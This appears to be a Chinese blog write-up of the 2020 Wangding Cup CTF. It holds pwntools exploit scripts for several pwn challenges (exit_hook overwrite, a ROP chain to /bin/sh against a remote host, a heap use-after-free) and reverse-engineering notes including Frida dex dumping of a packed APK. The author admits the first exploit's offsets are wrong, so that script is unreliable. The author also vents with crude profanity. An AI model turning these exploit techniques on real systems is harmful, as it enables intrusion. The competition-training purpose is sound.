---
title: 2020网鼎杯write-up(未完)
date: 2020-05-11 22:57:10
tags: CTF
---
# 青龙组
## PWN  
### boom1  
（这个题目，是以前没有做过的类型，很多分析都是靠猜测，师傅们轻喷……）
这个题拿到了一脸懵，八百多行代码把我看傻了，首先分析下  
![](wdb1.png)  
看到这里有很多text、data、stack段，猜测是个编译器  
![](wdb2.png)
然后这里有一堆符号表，都是C语言函数，猜测是个C语言编译器  
![](wdb3.png)
这个地方看上去要让我们输入源码了  
而且在很多判断条件的地方有";"、"{  }"这样的东西，就更加确定是C语言的东西了  
然后我们先试一试，是不是一个C语言编译器，先弄一段C语言代码输进去看看  
![](wdb4.jpg)  
有内味了  
调调看  
![](wdb5.png)
首先可以看到这里有一块很大的内存空间，就是mmap分配的，就是在那个malloc的地方分配出来的，我们的输入就在这个地方  
然后查看栈中的信息  
![](wdb6.png)
发现这么个玩意儿，直接找偏移把它leak了  
![](wdb7.png)
![](wdb8.png)
远程的话就可以根据这个来查libc版本了  
我们知道mmap分配的区域正好在libc那块内存空间的下方，所以我们输入的东西的地址和libc的偏移是固定的   
然后我们直接定义一个指针他会指向mmap那块区域，可以利用这个指针计算出与libc_base的偏移  
然后我们既然都可以定义变量了，那岂不是相当于源码级操作  
我们直接改写指针就能劫持exit_hook为one_gadget了   
exit_hook和malloc_hook差不多，  
详细参考:https://blog.csdn.net/qq_43116977/article/details/105485947   
那我们只需要将_rtld_global结构体中的__rtld_unlock_recursive劫持为one_gadget就行  
因为这个结构体是在libc中的，所以我们只需要一个字节一个字节的改，后三位改成one_gadget就能在执行exit函数时getshell了  
因为我好像环境不太一样了，复现不出getshell的结果来。贴图贴代码？ 👴贴个几把，👴做不到，偏移都是错的，👴吐了，做个几把，👴做这个题目做得十分暴躁，什么鬼题，最好给👴爬    
```python  
##!/usr/bin/env python
##coding=utf-8
from pwn import*
from LibcSearcher import *
import sys
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './main' 
local = 1
if local == 1:
    p=process(binary)
else:
    p=remote("182.92.73.10",24573)
elf=ELF(binary)
libc=elf.libc
def exp():
    payload = '''
    char *key;
    char *number;
    char *p;
    int main()
    {
    key = "N0vice";
    number = key - 0x529028;
    key = number + 6229832 - 3848 + 8;
    key[0] = 0;
    key = number + 6229832;
    p = 0xCD0F3 + number;
    key[0] = (p)&0xFF;
    key[1] = (p>>8)&0xFF;
    key[2] = (p>>16)&0xFF;
    printf("%p %p %p",number,p,*(int *)key);
    }'''
    payload = payload.replace('\n','')
    gdb.attach(p)
    p.sendline(payload)
    
    p.interactive()
exp()
```  
## Reverse  
### bang  
这个题是个Android逆向，首先用PKID查壳，发现是梆梆加固  
![](re1.png)
然后搭好安卓模拟器环境，用[FRIDA-DEXDump](https://github.com/hluwa/FRIDA-DEXDump)工具dump出dex来  
首先下载好x86的[server](https://github.com/frida/frida/releases)  
然后将server用adb push到模拟器中的/data/local/tmp/目录下  
接着adb connect 127.0.0.1:62001就可以连接到我的夜神模拟器  
然后adb shell，把server给一个可执行权限并运行  
然后在FRIDA-DEXDump目录下跑main.py脚本，就能dump出一堆dex  
![](re2.png)
大概长这样  
![(re5.png)
然后把这些dex用dex2jar工具转成jar，但是可能会出现这样的情况  
![](re3.jpg)
没有关系，一个一个试就行了  
接着用jd-gui打开，就能看到flag了  
![](re3.png)
```  
注意：模拟器大部分是x86架构，真机是arm架构，  
所以我们调试的时候需要用x86架构的server，如果用的arm在模拟器上跑就会报错  
跑脚本的时候，缺少什么东西直接pip install装上就行  
```  

# 白虎组
## Pwn  
### of  
```python  
from pwn import *
context.log_level='debug'

p=remote("123.57.225.26",42435)
rdx_rdi_rsi_syscall=0x400617
bss=0x601200
payload='a'*112+p64(bss)+p64(rdx_rdi_rsi_syscall)+p64(0x100)+p64(0)+p64(bss)+p64(bss)
payload += p64(rdx_rdi_rsi_syscall)+p64(0)+p64(bss)+p64(0)
p.sendline(payload)
payload='/bin/sh\x00'
payload=payload.ljust(58,'\x00')
p.sendline(payload)
p.interactive()
```  
## reverse  
### 恶龙  
这个题在IDA里面看，很多函数，有点复杂，先不管，就看那个菜单，boss这里，盲猜要打赢三个boss，然后执行三个decrypt函数生成flag，最后推出执行outflag  
![](hero3.png)
直接gdb调试做，需要让eff大于5000000，我们让程序跑起来看一下eff是多大  
![](hero1.png)
可以看到是0x64  
我们直接用命令set {int}0x603478 = 0x10000000 就能把eff改成0x10000000  
就满足条件了  
然后直接c一下，打赢三个boss出flag  
![](hero2.png)

# 朱雀组  
## Pwn  
### 魔法房间  
水题，参照HITCONtrainning-lab10  
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
from LibcSearcher import *
import sys
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './pwn' 
local = 0
if local == 1:
    p=process(binary)
else:
    p=remote("59.110.243.101",54621)
elf=ELF(binary)
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
def add(size,content):
    p.recvuntil("choice :")
    p.sendline("1")
    p.recvuntil("?")
    p.sendline(str(size))
    p.recvuntil("name :")
    p.sendline(content)

def delete(index):
    p.recvuntil("choice :")
    p.sendline("2")
    p.recvuntil("index :")
    p.sendline(str(index))

def view(index):
    p.recvuntil("choice :")
    p.sendline("3")
    p.recvuntil("index :")
    p.sendline(str(index))
def exp():
    add(0x40,"aaa")
    add(0x40,"bbb")

    delete(0)
    delete(1)

    add(0x18,"a"*8+p64(0x400A0D))
    view(0)
    p.interactive()
exp()
```   
### 云盾  
还没做出来，先咕了  
## reverse  
### go  
go语言写的exe，IDA打开查看主函数  
![](1.png)
可以看到，有一个类似于秘钥的东西  
我们在runtime_text里面找到了这串base64密文  
![](2.png)
直接用base64变表解出key  
```python  
import base64
import string

str1 = "nRKKAHzMrQzaqQzKpPHClX=="

string1 = "XYZFGHI2+/Jhi345jklmEnopuvwqrABCDKL6789abMNWcdefgstOPQRSTUVxyz01"
string2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

print (base64.b64decode(str1.translate(str.maketrans(string1,string2))))
# What_is_go_a_A_H
```  
输入key即可  
![](3.png)  
# 玄武组  
听说不好做，👴上了一天的课，做个🔨题目，比赛做了很累，👴还有很多事情没做完  
玄武组的题👴看心情写，有可能毕业了👴都没写  